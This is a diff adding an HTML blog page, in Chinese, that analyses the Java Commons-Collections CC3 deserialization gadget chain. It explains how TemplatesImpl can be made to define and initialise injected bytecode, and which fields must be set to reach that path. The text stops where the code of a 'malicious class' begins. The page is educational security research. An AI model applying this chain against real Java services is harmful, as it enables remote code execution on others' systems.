@@ -1,0 +1,403 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8" theme-name="Stellar" theme-version="1.26.8">
+  
+  <meta name="generator" content="Hexo 7.1.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin><link rel="preconnect" href="https://unpkg.com" crossorigin><link rel="preconnect" href="https://cdn.bootcdn.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>漏洞篇 - Java 反序列化之 CC3 链 - 妙尽璇机</title>
+
+  
+    <meta name="description" content="CC3 链的核心在于利用 TemplatesImpl 加载恶意类时执行静态代码块。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞篇 - Java 反序列化之 CC3 链">
+<meta property="og:url" content="https://changeyourway.github.io/2024/05/27/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC3%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="妙尽璇机">
+<meta property="og:description" content="CC3 链的核心在于利用 TemplatesImpl 加载恶意类时执行静态代码块。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240517084830066.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240517085104839.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240517085438851.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240517091101680.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240517091708581.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240517103843968.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240524155627516.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240524160402778.png">
+<meta property="article:published_time" content="2024-05-27T02:55:47.408Z">
+<meta property="article:modified_time" content="2024-10-06T08:22:40.691Z">
+<meta property="article:author" content="妙尽璇机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://changeyourway.github.io/images/image-20240517084830066.png">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="妙尽璇机" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.26.8">
+
+  
+    <link rel="shortcut icon" href="/assets/favicon/favicon.ico">
+  
+
+  
+
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/xaoxuu/favicon/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/xaoxuu/favicon/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/xaoxuu/favicon/favicon-16x16.png"><link rel="manifest" href="/assets/xaoxuu/favicon/site.webmanifest"><link rel="shortcut icon" href="/assets/xaoxuu/favicon/favicon.ico"><meta name="theme-color" content="#f8f8f8"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css" media="all" />
+</head>
+<body>
+
+<div class="l_body content tech" id="start" layout="post" ><aside class="l_left"><div class="sidebar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://avatars.githubusercontent.com/u/167730365?v=4" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">妙尽璇机</div><div class="sub cap">以真理之名，超越往昔</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="专栏" href="/topic/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+<widget class="widget-wrapper toc single" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CC3-%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text">CC3 链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-text">自定义类加载器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6"><span class="toc-text">双亲委派机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E4%B9%8B-TemplatesImpl-%E7%B1%BB"><span class="toc-text">利用链之 TemplatesImpl 类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93"><span class="toc-text">利用链总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E7%BB%95%E8%BF%87"><span class="toc-text">判断绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E4%B8%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F%E9%AA%8C%E8%AF%81%E4%B8%80%E4%B8%8B"><span class="toc-text">写个小程序验证一下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E4%B9%8B-TrAXFilter-%E7%B1%BB"><span class="toc-text">利用链之 TrAXFilter 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E7%B1%BB-InstantiateTransformer"><span class="toc-text">入口类 InstantiateTransformer</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E4%B8%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F%E9%AA%8C%E8%AF%81%E4%B8%80%E4%B8%8B-1"><span class="toc-text">写个小程序验证一下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-text">反序列化利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86-AnnotationInvocationHandler-%E4%BD%9C%E4%B8%BA%E5%85%A5%E5%8F%A3%E7%B1%BB"><span class="toc-text">将 AnnotationInvocationHandler 作为入口类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86-HashMap-%E4%BD%9C%E4%B8%BA%E5%85%A5%E5%8F%A3%E7%B1%BB"><span class="toc-text">将 HashMap 作为入口类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TrAXFilter-InstantiateTransformer-%E4%BB%A3%E6%9B%BF-InvokerTransformer"><span class="toc-text">TrAXFilter + InstantiateTransformer 代替 InvokerTransformer</span></a></li></ol></li></ol></li></ol></div></div></widget>
+
+
+
+
+
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2024/11/13/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-Hessian%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/"><span class="title">基础篇 - Hessian 协议详解</span></a><a class="item title" href="/2024/10/31/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC/"><span class="title">漏洞篇 - JavaAgent 内存马</span></a><a class="item title" href="/2024/10/23/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-JavaAgent%E8%AF%A6%E8%A7%A3/"><span class="title">基础篇 - Java Agent 详解</span></a><a class="item title" href="/2024/10/21/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Spring%E5%86%85%E5%AD%98%E9%A9%AC/"><span class="title">漏洞篇 - Spring 内存马</span></a><a class="item title" href="/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"><span class="title">漏洞篇 - Java 反序列化之 Rome 链</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    
+<div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/Java-%E5%AE%89%E5%85%A8/">Java 安全</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-05-27T02:55:47.408Z">2024-05-27</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-10-06T08:22:40.691Z">2024-10-06</time></span></div></div>
+</div>
+
+    
+    <div class="bottom">
+      <div class="text-area">
+        <h1 class="text title"><span>漏洞篇 - Java 反序列化之 CC3 链</span></h1>
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><p>CC3 链的核心在于利用 TemplatesImpl 加载恶意类时执行静态代码块。</p>
+<span id="more"></span>
+
+<h2 id="CC3-链分析"><a href="#CC3-链分析" class="headerlink" title="CC3 链分析"></a>CC3 链分析</h2><p>在分析 CC3 链之前，我们需要再深入地了解一下 Java 的类加载机制。虽然我前面有提到 Java 类加载的几种方式，但是这里还是需要再深入了解一下。</p>
+<p>推荐博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/1vxyz/p/17245206.html">Java 基础篇-类加载机制</a> </p>
+<p>​				   <a target="_blank" rel="noopener" href="https://www.cnblogs.com/caicz/p/12718026.html">ClassLoader，吃透它看这一篇就够了</a> </p>
+<h3 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h3><p>实现一个自定义类加载器需要继承 ClassLoader ，同时覆盖 findClass 方法。</p>
+<p>ClassLoader 里面有三个重要的方法 loadClass() 、findClass() 和 defineClass() 。</p>
+<p>loadClass() 方法是加载目标类的入口，它首先会查找当前 ClassLoader 以及它的双亲里面是否已经加载了目标类，如果没有找到就会让双亲尝试加载，如果双亲都加载不了，就会调用 findClass() 让自定义加载器自己来加载目标类。ClassLoader 的 findClass() 方法是需要子类来覆盖的，不同的加载器将使用不同的逻辑来获取目标类的字节码。拿到这个字节码之后再调用 defineClass() 方法将字节码转换成 Class 对象。</p>
+<h3 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h3><p>想要自定义类加载器，一定需要了解双亲委派模型</p>
+<p>双亲委派机制原理如下：</p>
+<p>类加载器根据全限定类名判断类是否加载，如果已经加载则直接返回已加载类。如果没有加载，类加载器会首先委托父类加载器加载此类。父类加载器也会采用相同的策略，查看是否自己已经加载该类，如果有就返回，没有就继续委托给父类进行加载，直到<code>BootStrapClassLoader</code>。如果父类加载器无法加载，就会交给子类进行加载，如果还不能加载就继续交给子类加载。顺序为 <code>BootStrapClassLoader-&gt;ExtClassLoader-&gt;AppClassLoader-&gt;自定义类加载器</code> 。</p>
+<p>双亲委派机制的好处：</p>
+<p>能够有效确保一个类的全局唯一性，当程序中出现多个限定名相同的类时，类加载器在执行加载时，始终只会加载其中的某一个类。加载的先后顺序其实确定了类被加载的优先级，如果出现了限定名相同的类，类加载器在执行加载时只会加载优先级最高的那个类。</p>
+<h3 id="利用链之-TemplatesImpl-类"><a href="#利用链之-TemplatesImpl-类" class="headerlink" title="利用链之 TemplatesImpl 类"></a>利用链之 TemplatesImpl 类</h3><p>TemplatesImpl 类中的静态内部类 TransletClassLoader 就是一个自定义类加载器，它继承了 ClassLoader ，重写了 defineClass 方法。defineClass() 完成类加载的加载 -&gt; 验证 -&gt; 准备 -&gt; 解析四个阶段，而静态代码块在初始化阶段被执行。所以可以把命令放在静态代码块中，最后利用 newInstance 方法完成初始化并执行它。</p>
+<h4 id="利用链总结"><a href="#利用链总结" class="headerlink" title="利用链总结"></a>利用链总结</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">TemplatesImpl#newTransformer()</span><br><span class="line">    TemplatesImpl#getTransletInstance()</span><br><span class="line">        TemplatesImpl#defineTransletClasses()</span><br><span class="line">            TransletClassLoader#defineClass()</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+
+<p>TransletClassLoader 静态内部类的 defineClass 方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class defineClass(final byte[] b) &#123;</span><br><span class="line">    return defineClass(null, b, 0, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里需要传入一个字节数组，字节数组中应当存放我们自定义类的字节码。接下来看看哪里调用了这个方法，defineTransletClasses 方法中调用了这个方法。</p>
+<p>defineTransletClasses 是外部类 TemplatesImpl 的成员方法，它调用了 TransletClassLoader 内部类的 defineClass 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240517084830066.png">
+
+<p>由于 defineTransletClasses 是私有方法，再找找谁调用了这个方法。</p>
+<p>getTransletInstance 方法调用了 defineTransletClasses 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240517085104839.png">
+
+<p>由于 getTransletInstance 是私有方法，再找找谁调用了这个方法。</p>
+<p>newTransformer 方法调用了 getTransletInstance ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240517085438851.png">
+
+<h4 id="判断绕过"><a href="#判断绕过" class="headerlink" title="判断绕过"></a>判断绕过</h4><p>刚才在看代码的时候看到一些判断条件，现在来过一下判断。</p>
+<p>getTransletInstance 方法中，如果 _name 为空那么将会直接返回 null，所以 _name 应该不为空，以及需要 _class 为空才能调用 defineTransletClasses 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240517091101680.png">
+
+<p>defineTransletClasses 方法中如果 _bytecodes 为空会直接抛出异常，所以这里 _bytecodes 应该不为空，以及下面会调用 _tfactory 方法，所以 _tfactory 不为空：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240517091708581.png">
+
+<p>总结一下：</p>
+<ul>
+<li><strong>_name 不为空</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private String _name = null;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>_class 为空</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private Class[] _class = null;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>_bytecodes 需要被赋值为字节码文件</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private byte[][] _bytecodes = null;</span><br></pre></td></tr></table></figure>
+
+<p>它后面会作为 defineClass 方法的参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_class[i] = loader.defineClass(_bytecodes[i]);</span><br></pre></td></tr></table></figure>
+
+<p>由于 _bytecodes 是一个二维数组，而传入的参数是 _bytecodes[i] ，也就是一个一维数组，所以我们需要创建一个一维数组，再把它放到 _bytecodes 二维数组中去。这里因为前面的循环次数取的是 _bytecodes 的长度，如果只传入一个一维数组，那么长度为 1 ，只循环一次，i 只能取到 0 这个值，那么 _bytecodes[i] 就是传入的一维数组：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240517103843968.png">
+
+<ul>
+<li><strong>_tfactory 需要被赋值为 TransformerFactoryImpl 对象</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private transient TransformerFactoryImpl _tfactory = null;</span><br></pre></td></tr></table></figure>
+
+<p>由于 _tfactory 被 transient 修饰，无法被序列化，因此没办法手动赋值。但是在 TemplatesImpl 类的 readObject 方法中有赋值语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_tfactory = new TransformerFactoryImpl();</span><br></pre></td></tr></table></figure>
+
+<p>所以 _tfactory 可以不用管。</p>
+<p>除此之外，我们还需要关注一件事：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240524155627516.png">
+
+<p>TemplatesImpl#defineTransletClasses() 会判断我们传入的类的父类是否为 ABSTRACT_TRANSLET ，如果是的话才会将 _transletIndex 赋值成 i （此时 i 为 0），而 _transletIndex 的默认值是 -1 ，如果这里不被赋值的话，下面经过判断后就会直接抛出异常。所以我们还要让传入的类继承 ABSTRACT_TRANSLET 。</p>
+<p>我们可以在 TemplatesImpl 类中查到 ABSTRACT_TRANSLET 属性的定义：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240524160402778.png">
+
+<p>可以看到它指代的类是 AbstractTranslet ，那么我们只需让传入的类继承 AbstractTranslet 类就行。</p>
+<h4 id="写个小程序验证一下"><a href="#写个小程序验证一下" class="headerlink" title="写个小程序验证一下"></a>写个小程序验证一下</h4><p>恶意类 Eval ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 